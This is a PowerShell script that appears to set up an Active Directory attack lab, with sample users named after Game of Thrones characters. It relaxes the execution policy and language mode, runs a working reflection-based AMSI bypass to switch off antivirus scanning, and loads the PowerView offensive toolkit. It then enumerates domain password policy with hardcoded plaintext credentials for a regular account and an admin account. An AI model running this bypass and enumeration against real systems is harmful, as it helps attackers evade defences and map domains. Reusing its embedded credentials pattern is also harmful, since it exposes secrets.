# Define credentials
$securePassword_regular = ConvertTo-SecureString "sexywolfy" -AsPlainText -Force
$credential_regular = New-Object System.Management.Automation.PSCredential("robb.stark", $securePassword_regular)

$securePassword_admin = ConvertTo-SecureString "iamthekingoftheworld" -AsPlainText -Force
$credential_admin = New-Object System.Management.Automation.PSCredential("robert.baratheon", $securePassword_admin)

# Create new named sessions
$AD_Module_session = New-PSSession -Name "ADModule"
$PV_Session = New-PSSession -Name "PowerView"

# Run commands in the ADModule session using Invoke-Command
Invoke-Command -Session $AD_Module_session -ScriptBlock {
    # Set Execution Policy to unrestricted
    Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -ErrorAction Stop

    # Unblock and import AD modules
    Unblock-File ./ADModule/Microsoft.ActiveDirectory.Management.dll -ErrorAction Stop
    Unblock-File ./ADModule/ActiveDirectory/ActiveDirectory.psd1 -ErrorAction Stop
    Import-Module ./ADModule/Microsoft.ActiveDirectory.Management.dll -Verbose -ErrorAction Stop
    Import-Module ./ADModule/ActiveDirectory/ActiveDirectory.psd1 -Verbose -ErrorAction Stop

    # Verify AD Module installation with Get-ADDomain
    try {
        Write-Output "Verifying AD module installation with Get-ADDomain..."
        Get-ADDomain -ErrorAction Stop
    } catch {
        Write-Output "AD Module verification failed. Get-ADDomain could not be run: $_"
    }
}

# Run commands in the PowerView session
Invoke-Command -Session $PV_Session -ScriptBlock {
    # Set Execution Policy and Full Language Mode
    Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -ErrorAction Stop
    $ExecutionContext.SessionState.LanguageMode = "FullLanguage"
    
    # AMSI Bypass
    Write-Output "Attempting AMSI bypass..."
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
    
    $output = try {
        amsiInitFailed
    } catch {
        $_.Exception.Message
    }
    
    # Check the output for specific error messages
    if ($output -match "is not recognized as the name of a cmdlet") {
        Write-Output "AMSI bypass successful: 'amsiInitFailed' is not recognized."
    } elseif ($output -match "has been blocked by your antivirus software") {
        Write-Output "AMSI bypass failed: 'amsiInitFailed' command got blocked by antivirus."
        exit 1  # Exit with an error code to signal failure
    } else {
        Write-Output "Unexpected output: $output"
        exit 1  # Exit with an error code for unexpected result
    }
    
    # Unblock and import PowerView module
    Unblock-File ./PowerView/PowerView.ps1 -ErrorAction Stop
    Import-Module ./PowerView/PowerView.ps1 -Verbose -ErrorAction Stop
    
    # Verify PowerView installation with Get-NetDomain
    try {
        Write-Output "Verifying PowerView installation with Get-NetDomain..."
        Get-NetDomain -ErrorAction Stop
    } catch {
        Write-Output "PowerView verification failed. Get-NetDomain could not be run: $_"
    }
}

# Run commands as `robb.stark`
Read-Host "Press Enter to run Get-ADDefaultDomainPasswordPolicy for ADModule as robb.stark"

Invoke-Command -Session $AD_Module_session -ScriptBlock {
    try {
        Get-ADDefaultDomainPasswordPolicy -Credential $using:credential_regular -ErrorAction Stop
    } catch {
        $_  # Output the error message directly
    }
}

Read-Host "Press Enter to run (Get-DomainPolicy).SystemAccess for PowerView as robb.stark"

Invoke-Command -Session $PV_Session -ScriptBlock {
    try {
        (Get-DomainPolicy -Credential $using:credential_regular).SystemAccess
    } catch {
        $_  # Output the error message directly
    }
}

# Run commands as `robert.baratheon`
Read-Host "Press Enter to run Get-ADDefaultDomainPasswordPolicy for ADModule as robert.baratheon"

Invoke-Command -Session $AD_Module_session -ScriptBlock {
    try {
        Get-ADDefaultDomainPasswordPolicy -Credential $using:credential_admin -ErrorAction Stop
    } catch {
        $_  # Output the error message directly
    }
}

Read-Host "Press Enter to run (Get-DomainPolicy).SystemAccess for PowerView as robert.baratheon"

Invoke-Command -Session $PV_Session -ScriptBlock {
    try {
        (Get-DomainPolicy -Credential $using:credential_admin).SystemAccess
    } catch {
        $_  # Output the error message directly
    }
}
